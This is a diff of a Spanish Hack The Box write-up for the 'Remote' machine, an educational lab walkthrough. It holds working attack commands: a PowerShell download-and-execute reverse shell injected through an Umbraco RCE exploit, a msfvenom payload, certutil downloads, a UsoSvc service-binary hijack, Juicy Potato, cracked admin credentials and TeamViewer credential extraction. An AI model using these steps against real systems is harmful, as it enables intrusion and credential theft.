@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Remote - Hack The Box
-excerpt: "Esta máquina es algo difícil, pues hay que investigar todos los servicios que usa y ver de cual nos podemos aprovechar para poder vulnerar los sistemas de la máquina, además de analizar los Exploits, estos se deben configurar correctamente para su uso."
+excerpt: "Esta máquina es algo difícil, pues hay que investigar todos los servicios que usa y ver de cual nos podemos aprovechar para poder vulnerar los sistemas de la máquina, además de analizar los Exploits, estos se deben configurar correctamente para su uso. Nos aprovechamos del servicio NSF para poder crear una montura y así obtener la contraseña para entrar al servicio Umbraco, una vez dentro encontramos que el Umbraco usa la versión 7.12.4 que es vulnerable a ejecución remota de comandos, por lo que cargamos una Reverse Shell que nos conecta a la máquina usando un Exploit de esta versión de Umbraco. Dentro logramos escalar privilegios de varias formas como explotando el servicio TeamViewer, cambiando el servicio UsoSvc, usando Juicy Potato y con un módulo de Metasploit."
 date: 2023-01-25
 classes: wide
 header:
@@ -15,22 +15,24 @@ tags:
   - Windows
   - FTP Enumeration
   - Umbraco
-  - Remote Code Execution (Authenticated)
+  - Remote Code Execution - Authenticated (RCE - Authenticated)
   - NFS Pentesting
   - Cracking Hash
   - Reverse Shell
   - TeamViewer Enumeration & Exploitation
   - CVE-2019-18988
-  - Abusing UsoSvc
-  - Juicy Potato
+  - Privesc - TeamViewer Enumeration & Exploitation (CVE-2019-18988)
+  - Privesc - Abusing UsoSvc
+  - Privesc - Juicy Potato
   - OSCP Style
   - Metasploit Framework
 ---
 ![](/assets/images/htb-writeup-remote/remote_logo.png)
 
-Esta máquina es algo difícil, pues hay que investigar todos los servicios que esta usando y ver de cual nos podemos aprovechar para poder vulnerar los sistemas de la máquina, además de analizar los Exploits, estos se deben configurar correctamente para su uso.
+Esta máquina es algo difícil, pues hay que investigar todos los servicios que esta usando y ver de cual nos podemos aprovechar para poder vulnerar los sistemas de la máquina, además de analizar los Exploits, estos se deben configurar correctamente para su uso. Nos aprovechamos del **servicio NFS** para poder crear una montura y así obtener la contraseña para entrar al **servicio Umbraco**, una vez dentro encontramos que el **Umbraco** usa la **versión 7.12.4** que es vulnerable a **ejecución remota de comandos**, por lo que cargamos una **Reverse Shell** que nos conecta a la máquina usando un Exploit de esta **versión de Umbraco**. Dentro logramos escalar privilegios de varias formas como explotando el **servicio TeamViewer**, cambiando el **servicio UsoSvc**, usando **Juicy Potato** y con un módulo de **Metasploit**.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *wappalizer*
 * *ftp*
@@ -44,9 +46,13 @@ Herramientas utilizadas:
 * *nc*
 * *rlwrap*
 * *msfvenom*
-* *certutil*
-* *msfconsole*
+* *certutil.exe*
+* *iwr*
+* *metasploit framework(msfconsole)*
+* *Módulo: exploit/multi/script/web_delivery*
+* *Módulo: post/windows/gather/credentials/teamviewer_passwords*
 * *meterpreter*
+
 
 <br>
 <hr>
@@ -59,13 +65,13 @@ Herramientas utilizadas:
 				<li><a href="#Puertos">Escaneo de Puertos</a></li>
 				<li><a href="#Servicios">Escaneo de Servicios</a></li>
 				<li><a href="#Investigacion">Investigación de Servicios</a></li>
+				<ul>
+                                        <li><a href="#Vulns">Buscando Vulnerabilidades para los Servicios Investigados</a></li>
+                                </ul>
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<ul>
-					<li><a href="#Vulns">Buscando Vulnerabilidades para los Servicios Investigados</a></li>
-				</ul>
-				<li><a href="#HTTP">Analizando Puerto 80</a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
 				<li><a href="#Umbraco">Investigando Servicio Umbraco</a></li>
 				<li><a href="#FTPSmb">Analizando Servicios FTP y SMB</a></li>
 				<li><a href="#NFS">Investigando Servicio NFS</a></li>
@@ -81,13 +87,10 @@ Herramientas utilizadas:
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
 				<li><a href="#exploit1">Explotando Servicio TeamViewer</a></li>
-			</ul>
-		<li><a href="#Otras">Otras Formas</a></li>
-			<ul>
                                 <li><a href="#exploit2">Utilizando winPEAS para Encontrar Vulnerabilidades</a></li>
 				<li><a href="#exploit3">Modificando Servicio UsoSvc</a></li>
 				<li><a href="#exploit4">Explotando Máquina con Juicy Potato</a></li>
-				<li><a href="#exploit5">Utilizando Modulo de Metasploit para Obtener Contraseñas de Administrador</a></li>
+				<li><a href="#exploit5">Utilizando Módulo de Metasploit para Obtener Contraseñas de Administrador</a></li>
                         </ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -98,10 +101,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -295,12 +295,14 @@ Esta usando una **API de Microsoft**, esto ya nos da una idea de que el servicio
 
 Antes de continuar e investigar la página web que está operando, veamos si no hay algún Exploit para los 4 servicios que ya investigamos, vamos a buscar por internet primero ya que no tenemos una versión en si de todos los servicios, si lo tuviéramos seria solamente buscar un Exploit con la herramienta **Searchsploit**.
 
+<br>
+
 <h3 id="Vulns">Buscando Vulnerabilidades para los Servicios Investigados</h3>
 
 Encontramos una página bastante interesante y que al parecer nos puede ayudar de aquí en adelante para futuras máquinas, pues te da referencias de lo que puedes hacer, lo que no puedes y de lo que necesitar para vulnerar ciertos servicios:
 
 Página **HackTricks**:
-* https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind
+* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind" target="_blank">HackTricks: 111/TCP/UDP - Pentesting Portmapper</a>
 
 Ahí incluso hay una sección que nos dice que el **servicio RPCBIND** puede ser vulnerable para cargar archivos si está activo junto al **servicio NFS**.
 
@@ -311,15 +313,12 @@ Esto quizá nos sirva más adelante, pero de momento vamos a investigar la pági
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
 
-<h2 id="HTTP">Analizando Puerto 80</h2>
+<h2 id="HTTP">Analizando Servicio HTTP</h2>
 
 Vamos a entrar en la página web que esta activa y veamos que hay:
 
@@ -372,7 +371,7 @@ Probamos esto y nada, no sirve, entonces de momento vamos a dejar **Umbraco** ha
 <h2 id="FTPSmb">Analizando Servicios FTP y SMB</h2>
 
 Primero vamos con el **servicio FTP**, ya que el escaneo de servicios nos menciona que podemos conectarnos como usuario **Anonymous** entonces veamos que hay dentro:
-```bash
+```batch
 ftp 10.10.10.180
 Connected to 10.10.10.180.
 220 Microsoft FTP Service
@@ -393,13 +392,15 @@ ftp> exit
 221 Goodbye.
 ```
 
-Nos conectamos y...nada, no nos muestra nada, quizá podamos ver si se pueden subir archivos. Probémoslo:
+Nos conectamos y...nada, no nos muestra nada, quizá podamos ver si se pueden subir archivos. 
+
+Probémoslo:
 ```bash
 whoami > test.txt
 ```
 
 Creamos un **archivo txt** con el comando **whoami** para ver si se puede subir y ejecutar en el **servicio FTP**, subamos el archivo:
-```bash
+```batch
 ftp 10.10.10.180 
 Connected to 10.10.10.180.
 220 Microsoft FTP Service
@@ -466,7 +467,7 @@ Si buscamos con el navegador **"Umbraco where is database"** nos saldra una pagi
 * **/App_Data folder** -> ESA SI ESTA!!!
 
 Como ya vimos, hay que investigar esa carpeta, pero antes, aquí el link de **Umbraco** sobre donde se almacena la BD: 
-* https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data
+* <a href="https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data" target="_blank">Where does Umbraco store data?</a>
 
 Ahora sí, veamos que hay en ese directorio:
 ```bash
@@ -483,6 +484,8 @@ Por cierto, los **sdf** son:
 | **Archivo SDF** |
 |:-----------:|
 | *Los archivos SDF se utilizan para almacenar bases de datos en un formato estructurado. Se trata de una extensión de archivo estándar o genérica no asociada con ningún programa ni versión de base de datos. Por tanto, estos archivos pueden importarse y exportarse fácilmente con numerosos programas de base de datos.* |
+
+<br>
 
 Entonces, lo que vamos a ver será una **base de datos**, no sería bueno usar el comando **cat** para ver que hay dentro porque no creo que lo muestre bien pues serian datos más no **strings** o texto en si:
 ```bash
@@ -505,10 +508,7 @@ Y ya con esto se guarda como tipo **string**, lo que nos permitirá ver con text
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -534,10 +534,9 @@ dAc0^A\pW
 ```
 Mira, ya tenemos dos usuarios y tenemos un hash que supongo es una contraseña, vamos a tratar de averiguar que es ese hash.
 
-Veamos que tipo de hash se esta utilizando, aunque claramente ya nos lo indica en el archivo, no esta de más comprobarlo. Usaremos 2 herramientas para esto: HashID y hash-identifier.
+Veamos que tipo de hash se esta utilizando, aunque claramente ya nos lo indica en el archivo, no esta de más comprobarlo. Usaremos 2 herramientas para esto: **HashID y hash-identifier**.
 
 * Probando **HashID**:
-
 ```bash
 hashid hash_admin
 --File 'hash_admin'--
@@ -556,7 +555,6 @@ Analyzing 'b8be16afba8c314ad33d812f22a04991b90e2aaa'
 Normalmente, el primer resultado es el que pertenece al hash, puede desplegar más resultados, pero ese es el que se toma en cuenta.
 
 * Probando **hash-identifier**:
-
 ```bash
 hash-identifier
    #########################################################################
@@ -573,11 +571,11 @@ hash-identifier
    #########################################################################
 --------------------------------------------------
  HASH: b8be16afba8c314ad33d812f22a04991b90e2aaa
-
+*
 Possible Hashs:
 [+] SHA-1
 [+] MySQL5 - SHA-1(SHA-1($pass))
-
+*
 Least Possible Hashs:
 [+] Tiger-160
 [+] Haval-160
@@ -586,7 +584,7 @@ Least Possible Hashs:
 ```
 Aquí directamente, nos dice que tipo de hash se uso, nos da otras opciones, pero siempre nos da el hash más acertado.
 
-Ahora, usaremos la herramienta **JohnTheRipper** para descifrar el hash:
+Ahora, usaremos la herramienta **JohnTheRipper** para descifrar el **hash**:
 ```bash
 john -w=/usr/share/wordlists/rockyou.txt hash_admin
 Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
@@ -611,7 +609,7 @@ Listo, tenemos la contraseña, aunque tambien podemos utilizar una opción de la
 ![](/assets/images/htb-writeup-remote/Captura12.png)
 
 Aquí el link de esta página: 
-* https://hashes.com/es/decrypt/hash
+* <a href="https://hashes.com/es/decrypt/hash" target="_blank">Desencriptador de Hashes</a>
 
 La contraseña que nos da es: **baconandcheese**
 
@@ -648,6 +646,8 @@ Shellcodes: No Results
 Papers: No Results
 ```
 
+<br>
+
 <h3 id="PruebaExp">Probando Exploit: Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution</h3>
 
 Vamos a usar el primero, aunque al parecer ambos son lo mismo:
@@ -668,7 +668,7 @@ mv 46153.py Umbraco_Exploit.py
 ```
 
 Y lo analizamos de arriba hacia abajo:
-```bash
+```python
 { string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
  proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\
 
@@ -678,7 +678,7 @@ host = "";
 ```
 
 Como se observa, nos pide 3 datos que ya tenemos y además esta esa parte del código en donde al parecer podemos inyectar algún comando como el Exploit que usamos en la máquina **Bounty Hunter**, vamos a llenar los datos que nos pide y vamos a probar con una **Traza ICMP*** para ver si funciona el Exploit:
-```bash
+```python
 { string cmd = "/c ping 10.10.14.9"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
  proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\
 
@@ -707,24 +707,26 @@ Resultado:
 tcpdump -i tun0 icmp -n
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
-18:59:56.827476 IP 10.10.10.180 > 10.10.14.9: ICMP echo request, id 1, seq 1, length 40
-18:59:56.827492 IP 10.10.14.9 > 10.10.10.180: ICMP echo reply, id 1, seq 1, length 40
-18:59:57.834902 IP 10.10.10.180 > 10.10.14.9: ICMP echo request, id 1, seq 2, length 40
-18:59:57.834914 IP 10.10.14.9 > 10.10.10.180: ICMP echo reply, id 1, seq 2, length 40
-18:59:58.851255 IP 10.10.10.180 > 10.10.14.9: ICMP echo request, id 1, seq 3, length 40
-18:59:58.851266 IP 10.10.14.9 > 10.10.10.180: ICMP echo reply, id 1, seq 3, length 40
-18:59:59.866337 IP 10.10.10.180 > 10.10.14.9: ICMP echo request, id 1, seq 4, length 40
-18:59:59.866347 IP 10.10.14.9 > 10.10.10.180: ICMP echo reply, id 1, seq 4, length 40
+18:59:56.827476 IP 10.10.10.180 > Tu_IP: ICMP echo request, id 1, seq 1, length 40
+18:59:56.827492 IP Tu_IP > 10.10.10.180: ICMP echo reply, id 1, seq 1, length 40
+18:59:57.834902 IP 10.10.10.180 > Tu_IP: ICMP echo request, id 1, seq 2, length 40
+18:59:57.834914 IP Tu_IP > 10.10.10.180: ICMP echo reply, id 1, seq 2, length 40
+18:59:58.851255 IP 10.10.10.180 > Tu_IP: ICMP echo request, id 1, seq 3, length 40
+18:59:58.851266 IP Tu_IP > 10.10.10.180: ICMP echo reply, id 1, seq 3, length 40
+18:59:59.866337 IP 10.10.10.180 > Tu_IP: ICMP echo request, id 1, seq 4, length 40
+18:59:59.866347 IP Tu_IP > 10.10.10.180: ICMP echo reply, id 1, seq 4, length 40
 ^C
 8 packets captured
 8 packets received by filter
 0 packets dropped by kernel
 ```
+
 Esto quiere decir que, si funciona dicho Exploit, ¿pero ahora que hacemos? Bueno, investigue como usar este Exploit y justo aparece una página que explica que hacer a continuación, aqui la página: 
-* https://vk9-sec.com/umbraco-cms-7-12-4-authenticated-remote-code-execution/
+* <a href="https://vk9-sec.com/umbraco-cms-7-12-4-authenticated-remote-code-execution/" target="_blank">Umbraco CMS 7.12.4 – (Authenticated) Remote Code Execution</a>
 
 Entonces vamos a crear una **Powershell Reverse Shell** para conectarnos de manera remota a la máquina que usa Umbraco, entonces vamos por pasos como indica la página:
-* Descargamos el repo **Nishang** para usar la shell que necesitamos: https://github.com/samratashok/nishang
+
+* Descargamos el repo **Nishang** para usar la shell que necesitamos: <a href="https://github.com/samratashok/nishang" target="_blank">Repositorio de samratashok: Nishang</a>
 ```bash
 git clone https://github.com/samratashok/nishang.git                                        
 Clonando en 'nishang'...
@@ -736,15 +738,14 @@ Recibiendo objetos: 100% (1705/1705), 10.89 MiB | 10.43 MiB/s, listo.
 Resolviendo deltas: 100% (1064/1064), listo.
 ```
 
-* Copiamos la siguiente shell que esta en la carpeta "Shells": **Invoke-PowerShellTcp.ps1**
-
+* Copiamos el siguiente archivo que esta en el directorio **Shells**: **Invoke-PowerShellTcp.ps1**
 ```bash
 cd nishang/shells
 cp Invoke-PowerShellTcp.ps1 path_donde_quieras_que_se_guarde/.
 ```
-* Entramos a la shell y agregamos la siguiente linea al final: **Invoke-PowerShellTcp -Reverse -IPAddress Tu_IP -Port PuertoQueQuieras**
 
-```bash
+* Entramos al archivo y agregamos la siguiente linea al final: `Invoke-PowerShellTcp -Reverse -IPAddress Tu_IP -Port PuertoQueQuieras`
+```batch
 {
         Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
         Write-Error $_
@@ -754,38 +755,35 @@ Invoke-PowerShellTcp -Reverse -IPAddress Tu_IP -Port PuertoQueQuieras
 ```
 
 * Modificamos el Exploit para que cargue la **Reverse Shell**:
-
-```bash
+```batch
 { string cmd = "/c powershell IEX(New-Object Net.WebClient).downloadString(\'http://Tu_IP/Invoke-PowerShellTcp.ps1\')"; System.Diagnost>
  proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\
 ```
 
 * Activamos una **netcat**:
-
 ```bash
 nc -nvlp 443                                        
 listening on [any] 443 ...
 ```
 
 * Activamos un servidor en **Python** para que la máquina descargue el Exploit:
-
 ```bash
 python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
-* Activamos el Exploit y vemos el resultado:
 
+* Activamos el Exploit y vemos el resultado:
 ```bash
 nc -nvlp 443                                        
 listening on [any] 443 ...
-connect to [10.10.14.9] from (UNKNOWN) [10.10.10.180] 49736
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.180] 49736
 Windows PowerShell running as user REMOTE$ on REMOTE
 Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 PS C:\windows\system32\inetsrv>whoami
 iis apppool\defaultapppool
 ```
 
-Incluso si vemos el servidor en Python, veremos cómo se descargó y está activo pues si lo quitamos, se quita todo:
+Incluso si vemos el servidor en **Python**, veremos cómo se descargó y está activo pues si lo quitamos, se quita todo:
 ```bash
 python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
@@ -799,10 +797,7 @@ Bien ya estamos dentro, ahora es cosa de buscar la flag del usuario y listo.
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
@@ -818,7 +813,7 @@ Bien, es hora de buscar que hay en la máquina. Investigamos en varios lados, pe
 <br>
 
 Si entramos en ese directorio, nos dirá la versión que esta instalada de **TeamViewer**:
-```bash
+```batch
 PS C:\Program Files (x86)> cd TeamViewer 
 PS C:\Program Files (x86)\TeamViewer> dir
 
@@ -859,13 +854,14 @@ Papers: No Results
 No creo que nos sirvan estos Exploits, mejor vamos a buscar por internet.
 
 Encontré el siguiente link con datos de interés:
-* https://github.com/mr-r3b00t/CVE-2019-18988/blob/master/manual_exploit.bat
+* <a href="https://github.com/mr-r3b00t/CVE-2019-18988/blob/master/manual_exploit.bat" target="_blank">Repositorio de ms-r3b00t: CVE-2019-18988</a>
 
 En este link hay varias pruebas que podemos hacer dentro de la máquina para obtener las **credenciales de Windows**:
 ```bash
 reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7
 ```
-Una vez usemos este comando, nos dará información muy útil que sera las credenciales pero encriptadas:
+
+Una vez usemos este comando, nos dará información muy útil que sera las credenciales, pero encriptadas:
 ```bash
 LastUpdateCheck    REG_DWORD    0x6250227f
     UsageEnvironmentBackup    REG_DWORD    0x1
@@ -874,18 +870,19 @@ LastUpdateCheck    REG_DWORD    0x6250227f
     MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
     Security_PasswordStrength    REG_DWORD    0x3
 ```
-Lo que necesitamos es desencriptar dichas credenciales, aunque la que más nos interesa es la de **SecurityPasswordAES**. Para desencriptarlas, vamos a usar un script en Python que creo el usuario del siguiente link.
-* https://whynotsecurity.com/blog/teamviewer/
+
+Lo que necesitamos es desencriptar dichas credenciales, aunque la que más nos interesa es la de **SecurityPasswordAES**. Para desencriptarlas, vamos a usar un script en **Python** que creo el usuario del siguiente link:
+* <a href="https://whynotsecurity.com/blog/teamviewer/" target="_blank">WhyNotSecurity - TeamViewer</a>
 
 Con leer el blog, vemos la aventura que se echó para descubrir como explotar las vulnerabilidades que se encontraron en el **TeamViewer Versión 7** y el cómo le haría para desencriptar dichas credenciales, incluso el siguiente link también explica todo esto pero ya resumido: 
-* https://kalilinuxtutorials.com/decryptteamviewer/
+* <a href="https://kalilinuxtutorials.com/decryptteamviewer/" target="_blank">DecryptTeamViewer: Enumerate & Decrypt TeamViewer Credentials From Windows Registry</a>
 
 Pero nosotros, vamos a ocupar esta versión: 
-* https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0
+<a href="https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0" target="_blank">Repositorio de rishdang: teamviewer_password_decrypt.py</a>
 
-Para usarlo es solo copiar el código en un archivo **.py** y tener instaladas los siguientes módulos de Python:
-* hexdump
-* pycryptodome
+Para usarlo es solo copiar el código en un archivo **.py** y tener instaladas los siguientes módulos de **Python**:
+* *hexdump*
+* *pycryptodome*
 
 PERO, antes de instalar algo, analice un poco el script y no se para que usa **hexdump** así que lo quite y sirvió el script.
 
@@ -921,7 +918,7 @@ SMB         10.10.10.180    445    REMOTE           [+] remote\Administrator:!R3
 ```
 
 Y si funciona, vamos a conectarnos remotamente con la herramienta **Evil Winrm**:
-```bash
+```batch
 evil-winrm -i 10.10.10.180 -u 'Administrator' -p '!R3m0te!'
 
 Evil-WinRM shell v3.4
@@ -950,23 +947,12 @@ Mode                LastWriteTime         Length Name
 ```
 Y ya, con esto obtenemos ambas flags y terminamos con esta máquina.
 
-
-<br>
-<br>
-<hr>
-<div style="position: relative;">
- <h1 id="Otras" style="text-align:center;">Otras Formas</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
-</div>
-<br>
-
-
 <h2 id="exploit2">Utilizando winPEAS para Encontrar Vulnerabilidades</h2>
 
-Vamos a cargar la super herramienta **winPEAS**, para que nos muestre si hay alguna manera de escalar privilegios. Primero, ve al siguiente link y descarga la versión 64x:
-* https://github.com/carlospolop/PEASS-ng/releases/tag/20240324-2c3cd766
+Vamos a cargar la super herramienta **winPEAS**, para que nos muestre si hay alguna manera de escalar privilegios. 
+
+Primero, ve al siguiente link y descarga la **versión 64x**:
+* <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20240324-2c3cd766" target="_blank">Repositorio de carlospolop: PEAS-ng - releases</a>
 
 Una vez que lo tengas descargado, abre un servidor web con **Python** y descargalo en la máquina víctima, ya sea, usando **certutil o iwk**:
 
@@ -976,17 +962,17 @@ python -m http.server 80
 ```
 
 * Descargando **winPEAS** con **certutil**:
-```bash
+```batch
 certutil -urlcache -f http://Tu_IP/winPEASx64.exe winPeas.exe
 ```
 
-* Descargando **winPEAS** con **iwk**:
-```bash
+* Descargando **winPEAS** con **iwr**:
+```batch
 iwr http://Tu_IP:80/winPEASx64.exe -OutFile winPeas.exe
 ```
 
 Comprobamos que se haya descargado:
-```bash
+```batch
 PS C:\Users\Public\Desktop> dir
 
 
@@ -1001,7 +987,7 @@ Mode                LastWriteTime         Length Name
 ```
 
 Y lo ejecutamos:
-```bash
+```batch
 winPeas.exe
 winPeas.exe
 ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
@@ -1039,7 +1025,7 @@ ADVISORY: winpeas should be used for authorized penetration testing and/or educa
 ```
 
 Observa las siguientes vulnerabilidades que vamos a explotar:
-```bash
+```batch
 [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
  [*] OS Version: 1809 (17763)
  [*] Enumerating installed KBs...
@@ -1100,7 +1086,6 @@ Vamos a probar 3 formas de explotar la máquina:
 * Utilizando **Juicy Potato**.
 * Descubriendo la contraseña de **TeamViewer** usando modulo de **Metasploit Framework**.
 
-
 <h2 id="exploit3">Modificando Servicio UsoSvc</h2>
 
 Para realizar este proceso, necesitamos una **Reverse Shell** para conectarnos en otra terminal y necesitamos modificar el **servicio UsoSvc**, de tal forma que al activar este servicio, ejecute un comando como Administrador para conectarnos como administrador.
@@ -1114,7 +1099,7 @@ Pero, ¿qué es el **servicio UsoSvc**?
 <br>
 
 La siguiente página nos dice como modificar el **servicio UsoSvc**:
-* https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
+* <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services" target="_blank">HackTricks: Windows Local Privilege Escalation - Services</a>
 
 Vamonos por pasos:
 
@@ -1123,10 +1108,13 @@ Vamonos por pasos:
 msfvenom -p windows/shell_reverse_tcp LHOST=Tu_IP LPORT=1337 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe
 ```
 
-* Cargando **Reverse Shell** en la máquina víctima:
+* Abre un servidor con **Python**:
 ```bash
 python3 -m http.server 80
-.
+```
+
+* Cargando **Reverse Shell** en la máquina víctima:
+```bash
 C:\Users\Public\Desktop>certutil -urlcache -f http://Tu_IP/shell.exe shell.exe
 certutil -urlcache -f http://Tu_IP/shell.exe shell.exe
 ****  Online  ****
@@ -1134,7 +1122,7 @@ CertUtil: -URLCache command completed successfully.
 ```
 
 * Modificando **servicio UsoSvc**:
-```bash
+```batch
 C:\Users\Public\Desktop>sc.exe stop UsoSvc
 .
 C:\Users\Public\Desktop>sc.exe config UsoSvc binpath="C:\Users\Public\Desktop\shell.exe"
@@ -1147,7 +1135,7 @@ listening on [any] 1337 ...
 ```
 
 * Iniciando **servicio UsoSvc**:
-```bash
+```batch
 C:\Users\Public\Desktop>sc.exe start UsoSvc
 sc.exe start UsoSvc
 [SC] StartService FAILED 1053:
@@ -1156,10 +1144,10 @@ The service did not respond to the start or control request in a timely fashion.
 ```
 
 * Obtenemos la sesión como administrador:
-```bash
+```batch
 rlwrap nc -nlvp 1337
 listening on [any] 1337 ...
-connect to [XX.XX.XX.XX] from (UNKNOWN) [10.10.10.180] 49900
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.180] 49900
 Microsoft Windows [Version 10.0.17763.107]
 (c) 2018 Microsoft Corporation. All rights reserved.
 .
@@ -1170,18 +1158,23 @@ nt authority\system
 
 <h2 id="exploit4">Explotando Máquina con Juicy Potato</h2>
 
-Para este, necesitamos utilizar una **Reverse Shell**, tener descargado el **Juicy Potato**, para descargarlo, utiliza el siguiente link:
-* https://github.com/carlospolop/PEASS-ng/releases/tag/20240324-2c3cd766
+Para este, necesitamos utilizar una **Reverse Shell** y tener descargado el **Juicy Potato**. 
+
+Para descargarlo, utiliza el siguiente link:
+* <a href="https://github.com/ohpe/juicy-potato/releases" target="_blank">Repositorio de ohpe: Juicy Potato - releases</a>
 
 Y necesitamos tener un **CLSID**, para este caso, podemos utilizar el **CLSID** que tiene el **servicio UsoSvc**. Prueba si no es necesario modificar el **UsoSvc** antes de usar el **Juicy Potato**, no deberías tener problemas, pero si es el caso, modificalo como en la forma anterior. El **CLSID** lo podemos obtener de la siguiente página:
-* https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise/
+* <a href="https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise/" target="_blank">Juicy Potato CLSID Windows 10 Enterprise</a>
 
 Ahora, podemos utilizar la misma **Reverse Shell** que ya hicimos, entonces, carguemos el **Juicy Potato** en la máquina víctima y ejecutemoslo:
 
-* Cargando **Juicy Potato** a la máquina víctima:
+* Abre un servidor con **Python** donde tengas el **Juicy Potato**:
 ```bash
 python3 -m http.server 80
-.
+```
+
+* Cargando **Juicy Potato** a la máquina víctima:
+```batch
 certutil.exe -urlcache -split -f http://Tu_IP/JuicyPotato.exe JuicyP.exe           
 certutil.exe -urlcache -split -f http://Tu_IP/JuicyPotato.exe JuicyP.exe
 ****  Online  ****
@@ -1197,7 +1190,7 @@ listening on [any] 1337 ...
 ```
 
 * Ejecutando **Juicy Potato**:
-```bash
+```batch
 C:\Users\Public\Desktop>JuicyP.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Users\Public\Desktop\shell.exe -e cmd Tu_IP 1337" -c {B91D5831-B1BD-4608-8198-D72E155020F7}
 JuicyP.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Users\Public\Desktop\shell.exe -e cmd Tu_IP 1337" -c {B91D5831-B1BD-4608-8198-D72E155020F7}
 Testing {B91D5831-B1BD-4608-8198-D72E155020F7} 1337
@@ -1205,10 +1198,10 @@ COM -> recv failed with error: 10038
 ```
 
 * Obtenemos la sesión como administrador:
-```bash
+```batch
 rlwrap nc -nlvp 1337
 listening on [any] 1337 ...
-connect to [XX.XX.XX.XX] from (UNKNOWN) [10.10.10.180] 49900
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.180] 49900
 Microsoft Windows [Version 10.0.17763.107]
 (c) 2018 Microsoft Corporation. All rights reserved.
 . 
@@ -1217,7 +1210,7 @@ whoami
 nt authority\system
 ```
 
-<h2 id="exploit5">Utilizando Modulo de Metasploit para Obtener Contraseñas de Administrador</h2>
+<h2 id="exploit5">Utilizando Módulo de Metasploit para Obtener Contraseñas de Administrador</h2>
 
 Por último, vamos a crear una sesión en **meterpreter**, utilizando el **Metasploit Framework** para que podamos usar el modulo contra el **TeamViewer**.
 
@@ -1309,14 +1302,12 @@ Active sessions
 
 Excelente, ahora, busquemos un Exploit para el **TeamVIewer**, lo cargamos para usarlo en la sesión actual y lo ejecutamos:
 
-* Buscando Exploit, usamos el modulo que obtiene las contraseñas del **TeamViewer**:
+* Buscando Exploit, usamos el módulo que obtiene las contraseñas del **TeamViewer**:
 
 ```bash
 msf6 exploit(multi/script/web_delivery) > search teamviewer
-.
 Matching Modules
